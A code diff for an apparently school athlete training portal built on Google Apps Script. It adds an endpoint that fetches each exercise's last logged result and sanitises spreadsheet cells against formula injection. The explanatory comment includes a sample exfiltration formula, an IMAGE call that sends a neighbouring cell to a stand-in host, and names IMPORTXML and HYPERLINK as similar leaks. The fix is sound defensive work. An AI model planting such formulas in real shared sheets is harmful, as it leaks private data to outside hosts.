@@ -258,6 +258,9 @@ function doGet(e) {
     if (action === 'getSquadPulse') {
       return apJson(handleGetSquadPulse(ss, e.parameter.athleteId, e.parameter.weekStart));
     }
+    if (action === 'getLastTimes') {
+      return apJson(handleGetLastTimes(ss, e.parameter.athleteId, e.parameter.names, e.parameter.todayISO));
+    }
     if (action === 'getExerciseHistory') {
       return apJson(handleGetExerciseHistory(ss, e.parameter.athleteId, e.parameter.name, e.parameter.todayISO));
     }
@@ -2942,7 +2945,7 @@ function apReadObjects(sheet) {
     var obj = {};
     var blank = true;
     for (var c = 0; c < headers.length; c++) {
-      obj[headers[c]] = data[i][c];
+      obj[headers[c]] = apUnsafeCell_(data[i][c]);
       if (data[i][c] !== '' && data[i][c] !== null) blank = false;
     }
     obj.__row = i + 1; // 1-based sheet row for in-place updates
@@ -2952,13 +2955,46 @@ function apReadObjects(sheet) {
 }
 
 // Build a row array aligned to the sheet's header order from a field map
+// ---- Spreadsheet formula injection ----------------------------------------
+// A Google Sheet treats any string starting = + - @ as a FORMULA, and it
+// evaluates when the sheet is opened. Every free-text field a student can type
+// into — a session note, an exercise name, a PB note, a year goal — is written
+// straight into a cell, so until now a student could type
+//
+//     =IMAGE("https://example.com/x?d="&A1)
+//
+// into a note, and it would run in the teacher's browser the next time the
+// sheet was opened, with the neighbouring cell appended to the request. The
+// same trick with IMPORTXML or HYPERLINK leaks whatever the formula can reach.
+// Nothing in the portal was guarding against it and nothing would have shown
+// a trace of it in the app.
+//
+// The fix is the standard one: prefix the dangerous first character with an
+// apostrophe, which Sheets reads as "this is text, not a formula". Numbers,
+// dates and booleans are left exactly as they are, so nothing that should be
+// arithmetic stops being arithmetic.
+function apSafeCell_(v) {
+  if (typeof v !== 'string' || !v) return v;
+  return /^[=+\-@\t\r]/.test(v) ? ("'" + v) : v;
+}
+function apSafeRow_(row) {
+  for (var i = 0; i < row.length; i++) row[i] = apSafeCell_(row[i]);
+  return row;
+}
+// The mirror of apSafeCell_, for reads. Only unwraps an apostrophe that is
+// actually shielding a formula character, so a legitimate "'Twas" is untouched.
+function apUnsafeCell_(v) {
+  if (typeof v !== 'string') return v;
+  return /^'[=+\-@\t\r]/.test(v) ? v.slice(1) : v;
+}
+
 function apBuildRow(sheet, fields) {
   var headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
   var row = new Array(headers.length);
   for (var c = 0; c < headers.length; c++) {
     row[c] = (fields.hasOwnProperty(headers[c])) ? fields[headers[c]] : '';
   }
-  return row;
+  return apSafeRow_(row);
 }
 
 // Write a field map onto an existing row (header-aligned, only provided fields)
@@ -2971,7 +3007,7 @@ function apUpdateRow(sheet, rowNum, fields) {
   for (var c = 0; c < headers.length; c++) {
     if (fields.hasOwnProperty(headers[c])) row[c] = fields[headers[c]];
   }
-  sheet.getRange(rowNum, 1, 1, lastCol).setValues([row]);
+  sheet.getRange(rowNum, 1, 1, lastCol).setValues([apSafeRow_(row)]);
 }
 
 // Minimal athlete lookup (name/grade/sport) for the portal nav + identity
@@ -3648,6 +3684,51 @@ function handleGetPBs(ss, athleteId) {
     }
     out.sort(function (a, b) { return (b.date || '').localeCompare(a.date || ''); });
     return { success: true, pbs: out };
+  } catch (error) {
+    return { success: false, error: error.toString() };
+  }
+}
+
+// Last time you did each of these, in ONE call.
+//
+// The single most useful thing to see before your first set is what you did
+// last time, and it was two taps away behind History — so in practice nobody
+// saw it, and nobody progressed the weight because nobody knew what the weight
+// had been. Doing it per exercise would be eight round trips to Apps Script at
+// the top of every workout, which is slow enough that it would not get used
+// either. One call, one sheet read, a map back.
+//
+// `names` is a tab-separated list, because exercise names legitimately contain
+// commas ("Split squat, rear foot elevated").
+function handleGetLastTimes(ss, athleteId, names, todayISO) {
+  try {
+    athleteId = String(athleteId || '').trim();
+    var list = String(names || '').split('\t').map(function (n) { return String(n || '').trim(); }).filter(Boolean);
+    if (!athleteId || !list.length) return { success: true, last: {} };
+    var want = {};
+    for (var a = 0; a < list.length; a++) want[list[a].toLowerCase()] = 1;
+    var today = String(todayISO || '').trim();
+    var rows = apReadObjects(apEnsureTrainingSessions(ss));
+    var best = {};   // lowercased name -> most recent { date, detail }
+    for (var i = 0; i < rows.length; i++) {
+      if (String(rows[i].Athlete_ID).trim() !== athleteId) continue;
+      var st = String(rows[i].Status || '').trim().toLowerCase();
+      if (st !== 'done' && st !== 'modified') continue;   // only what was actually done
+      var d = apDateStr(rows[i].Date);
+      if (!d || (today && d >= today)) continue;          // strictly before today
+      var workout = apParse(rows[i].Planned_JSON, []);
+      if (!workout || !workout.length) continue;
+      for (var j = 0; j < workout.length; j++) {
+        var it = workout[j];
+        var nm = (it && (typeof it === 'string' ? it : it.name)) || '';
+        var key = String(nm).trim().toLowerCase();
+        if (!key || !want[key]) continue;
+        var detail = (it && typeof it === 'object' && it.detail) ? String(it.detail) : '';
+        if (!detail) continue;
+        if (!best[key] || d > best[key].date) best[key] = { date: d, detail: detail };
+      }
+    }
+    return { success: true, last: best };
   } catch (error) {
     return { success: false, error: error.toString() };
   }
